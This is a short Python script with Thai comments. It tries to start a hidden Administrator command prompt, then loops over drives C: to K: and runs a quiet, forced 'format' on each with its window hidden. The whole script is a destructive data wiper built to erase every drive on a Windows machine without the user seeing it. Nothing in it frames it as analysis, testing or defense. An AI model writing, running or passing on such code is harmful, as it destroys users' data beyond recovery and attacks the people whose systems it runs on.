import subprocess
import os

# เปิด CMD พร้อมสิทธิ์ Administrator โดยไม่ให้แสดงหน้าต่าง
subprocess.Popen("runas /user:Administrator cmd.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

# รันคำสั่ง format สำหรับ C: D: E: และไดรฟ์อื่น ๆ ในระบบ
drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:']
    
for drive in drives:
    try:
        # รันคำสั่ง format บนไดรฟ์โดยไม่ให้แสดงหน้าต่าง
        subprocess.run(f'format {drive} /FS:NTFS /Q /Y', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        # ข้ามไดรฟ์ที่ไม่มี
        continue